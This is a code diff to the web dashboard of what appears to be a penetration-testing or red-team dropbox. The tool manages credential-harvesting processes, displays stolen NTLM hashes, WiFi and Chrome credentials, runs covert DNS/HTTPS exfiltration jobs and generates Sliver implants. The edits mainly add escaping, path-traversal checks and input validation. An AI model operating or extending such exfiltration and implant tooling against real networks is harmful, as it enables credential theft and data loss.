@@ -71,7 +71,7 @@ _VALID_PROCS = {"scan", "responder", "bettercap", "crack", "hashcat", "sliver", 
 
 @app.before_request
 def _require_auth():
-    if request.endpoint in ("login", "logout"):
+    if request.endpoint in ("login", "logout", "mobile_manifest"):
         return None
     if session.get("authed") or request.headers.get("X-HexBox-Token") == _TOKEN:
         return None
@@ -1287,7 +1287,7 @@ async function refreshLoot() {
       (groups[dir] = groups[dir]||[]).push(f);
     });
     div.innerHTML = Object.entries(groups).map(([dir, files]) =>
-      `<div class="sec">/${dir} (${files.length})</div>` +
+      `<div class="sec">/${esc(dir)} (${files.length})</div>` +
       files.map(f =>
         `<div class="loot-row">` +
         `<a data-path="${esc(f.path)}" onclick="downloadLootFile(this.dataset.path)">${esc(f.path)}</a>` +
@@ -1324,10 +1324,10 @@ async function loadReportStats() {
     const j = await (await fetch('/intel/creds')).json();
     const s = j.summary||{};
     document.getElementById('report-stats').innerHTML =
-      `<div class="rstat"><span class="rnum">${s.hash_count||0}</span><span class="rlbl">NTLM Hashes</span></div>` +
-      `<div class="rstat"><span class="rnum">${s.wifi_count||0}</span><span class="rlbl">WiFi Creds</span></div>` +
-      `<div class="rstat"><span class="rnum">${s.host_count||0}</span><span class="rlbl">Hosts</span></div>` +
-      `<div class="rstat"><span class="rnum">${s.chrome_count||0}</span><span class="rlbl">Chrome DBs</span></div>`;
+      `<div class="rstat"><span class="rnum">${parseInt(s.hash_count)||0}</span><span class="rlbl">NTLM Hashes</span></div>` +
+      `<div class="rstat"><span class="rnum">${parseInt(s.wifi_count)||0}</span><span class="rlbl">WiFi Creds</span></div>` +
+      `<div class="rstat"><span class="rnum">${parseInt(s.host_count)||0}</span><span class="rlbl">Hosts</span></div>` +
+      `<div class="rstat"><span class="rnum">${parseInt(s.chrome_count)||0}</span><span class="rlbl">Chrome DBs</span></div>`;
   } catch(_) {}
 }
 
@@ -1711,7 +1711,7 @@ function _buildLeafletMap(nets) {
   nets.forEach(n => {
     const enc = n.encryption === 'Open' ? '🔓 Open' : '🔒 '+n.encryption;
     L.marker([n.lat, n.lon])
-      .bindPopup(`<b>${n.ssid||'(hidden)'}</b><br>${n.bssid}<br>${enc}<br>${n.signal} dBm`)
+      .bindPopup(`<b>${esc(n.ssid||'(hidden)')}</b><br>${esc(n.bssid)}<br>${esc(enc)}<br>${esc(String(n.signal||'?'))} dBm`)
       .addTo(_leafletMap);
     bounds.push([n.lat, n.lon]);
   });
@@ -2118,8 +2118,10 @@ def intel_cracked():
 # Routes — Covert exfil
 # ---------------------------------------------------------------------------
 
-_exfil_log: list[str] = []
-_exfil_lock = threading.Lock()
+_exfil_log:     list[str] = []
+_exfil_lock     = threading.Lock()
+_exfil_running  = threading.Event()   # set while an exfil job is in progress
+_EXFIL_KEY_DEFAULT = "change-me-to-32-byte-secret-key!"
 
 
 def _exfil_import():
@@ -2145,8 +2147,9 @@ def exfil_status():
     return jsonify(
         dns_domain  = _EXFIL_CFG.get("dns_domain",  "") or "",
         https_url   = _EXFIL_CFG.get("https_url",   "") or "",
-        aes_key_set = bool(_EXFIL_CFG.get("aes_key", "").strip()
-                           not in ("", "change-me-to-32-byte-secret-key!")),
+        aes_key_set = bool(_EXFIL_CFG.get("aes_key", _EXFIL_KEY_DEFAULT)
+                           not in ("", _EXFIL_KEY_DEFAULT)),
+        running     = _exfil_running.is_set(),
         last_ts     = log_lines[-1][:19] if log_lines else None,
         log_lines   = log_lines,
         loot_files  = loot_files,
@@ -2161,24 +2164,48 @@ def exfil_send():
         return jsonify(error="method must be 'dns' or 'https'"), 400
     file_rel = data.get("file") or None
 
-    def _run():
-        mod = _exfil_import()
-        result = mod.exfil_loot(LOOT, _EXFIL_CFG, method, file_rel)
-        ts  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        msg = f"[{ts}] method={method} ok={result.get('ok')} bytes={result.get('bytes','?')} {result.get('error','')}"
-        with _exfil_lock:
-            _exfil_log.append(msg)
-            if len(_exfil_log) > 200:
-                del _exfil_log[:-200]
-        _log(f"Exfil {method}: {result}")
-        return result
+    # Validate file_rel for path traversal before passing to exfil module
+    if file_rel is not None:
+        try:
+            target = (LOOT / file_rel).resolve()
+            target.relative_to(LOOT.resolve())
+            if not target.is_file():
+                return jsonify(error="file not found in loot directory"), 404
+        except (ValueError, OSError):
+            return jsonify(error="invalid file path"), 400
 
-    try:
-        result = _run()
-        return jsonify(**result)
-    except Exception as e:
-        _log(f"Exfil error: {e}")
-        return jsonify(error=str(e), ok=False), 500
+    # Warn if using default key (still allows the operation, but logs a warning)
+    if _EXFIL_CFG.get("aes_key", _EXFIL_KEY_DEFAULT) == _EXFIL_KEY_DEFAULT:
+        _log("[WARN] Exfil triggered with default AES key — change aes_key in config.json!")
+
+    if _exfil_running.is_set():
+        return jsonify(error="Exfil already in progress", ok=False, running=True), 409
+
+    def _run():
+        _exfil_running.set()
+        try:
+            mod = _exfil_import()
+            result = mod.exfil_loot(LOOT, _EXFIL_CFG, method, file_rel)
+            ts  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            ok_str = result.get("ok")
+            msg = f"[{ts}] method={method} ok={ok_str} bytes={result.get('bytes','?')} {result.get('error','')}"
+            with _exfil_lock:
+                _exfil_log.append(msg)
+                if len(_exfil_log) > 200:
+                    del _exfil_log[:-200]
+            _log(f"Exfil {method}: {result}")
+        except Exception as e:
+            _log(f"Exfil error: {e}")
+            with _exfil_lock:
+                _exfil_log.append(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ERROR: {e}")
+        finally:
+            _exfil_running.clear()
+
+    # Always dispatch to background thread — DNS exfil can run for minutes/hours
+    t = threading.Thread(target=_run, daemon=True)
+    t.start()
+    return jsonify(ok=True, running=True,
+                   message=f"Exfil ({method}) started in background — poll /exfil/log for status")
 
 
 @app.route("/exfil/log")
@@ -2251,7 +2278,13 @@ h1{color:#00ff88;font-size:1.1em;border-bottom:1px solid #1a2e1a;padding-bottom:
 </div>
 
 <script>
-const tok = document.cookie.match(/hexbox_tok=([^;]+)/)?.[1] || '';
+// HTML-escape helper (mirrors main dashboard esc())
+function mEsc(s){
+  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;')
+                      .replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+
+const tok = '__HEXBOX_TOKEN__';
 const hdrs = {'Content-Type':'application/json'};
 if(tok) hdrs['X-HexBox-Token'] = tok;
 
@@ -2277,7 +2310,7 @@ async function refresh(){
   const procs = document.getElementById('m-procs');
   if(j.procs && j.procs.length){
     procs.innerHTML = j.procs.map(p=>
-      `<div class="stat"><span><span class="dot ok"></span>${p.name}</span><span class="ts">pid ${p.pid}</span></div>`
+      `<div class="stat"><span><span class="dot ok"></span>${mEsc(p.name)}</span><span class="ts">pid ${parseInt(p.pid)||0}</span></div>`
     ).join('');
   }else{
     procs.innerHTML='<span style="color:#555">No active processes</span>';
@@ -2309,7 +2342,11 @@ setInterval(refresh, 30000);
 
 @app.route("/mobile")
 def mobile_dashboard():
-    return _MOBILE_HTML, 200, {"Content-Type": "text/html; charset=utf-8"}
+    # Embed the API token into the page so the standalone PWA can authenticate.
+    # The /mobile route is already auth-protected, so only authenticated sessions
+    # receive the token.
+    html = _MOBILE_HTML.replace("'__HEXBOX_TOKEN__'", json.dumps(_TOKEN))
+    return html, 200, {"Content-Type": "text/html; charset=utf-8"}
 
 
 @app.route("/mobile/manifest.json")
@@ -2335,8 +2372,14 @@ def mobile_data():
         sys.path.insert(0, str(Path(__file__).parent))
         from parse_loot import aggregate_intel, parse_cracked_passwords
 
-    intel   = aggregate_intel(LOOT, LOGS)
-    cracked = parse_cracked_passwords(LOOT)
+    try:
+        intel = aggregate_intel(LOOT, LOGS)
+    except Exception:
+        intel = {}
+    try:
+        cracked = parse_cracked_passwords(LOOT)
+    except Exception:
+        cracked = []
 
     # wardrive quick stats
     wd_file = LOOT / "wardrive" / "networks.json"
@@ -3094,6 +3137,14 @@ def sliver_generate():
         return jsonify(error="invalid arch"), 400
     if fmt not in ("exe", "shellcode", "shared", "service"):
         return jsonify(error="invalid format"), 400
+    # Validate listener to prevent newline/whitespace REPL injection via stdin
+    import urllib.parse as _urlparse
+    try:
+        _p = _urlparse.urlparse(listener)
+        if _p.scheme not in ("http", "https") or not _p.netloc or "\n" in listener or "\r" in listener or " " in listener:
+            raise ValueError
+    except Exception:
+        return jsonify(error="invalid listener URL"), 400
 
     _SLIVER_IMPLANTS.mkdir(parents=True, exist_ok=True)
     cmd = (f"generate --{fmt.replace('exe','exe')} "
